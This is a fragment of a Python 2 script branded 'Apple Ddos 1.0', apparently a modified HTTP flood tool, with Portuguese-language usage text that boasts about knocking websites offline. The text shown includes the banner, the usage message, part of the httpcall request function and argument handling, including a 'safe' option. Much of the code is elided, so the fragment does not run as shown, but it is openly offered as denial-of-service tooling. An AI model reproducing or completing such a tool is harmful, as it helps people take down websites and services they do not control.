...
def usage():
	print '---------------------------------------------------'
	print 'Pra usar a ferramenta da Apple faiz esse comanduh aq: python Apple.py <url>'
	print 'Script Modificado by: Apple Novas Versoes em breve. :) '
	print "\a"
print \
"""                    ___   _____   _____   _       _____  
  ...
  / / | | |  ___/ |  ___/ | |     |  __|  
 / /  | | | |     | |     | |___  | |___  
/_/   |_| |_|     |_|     |_____| |_____|    Apple Ddos 1.0
"""
print '---------------------------------------------------'
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
 			print 'Apple ddos derruba geral'
			code=500
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "Hack detonador de hp e sites criado por : Apple "
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
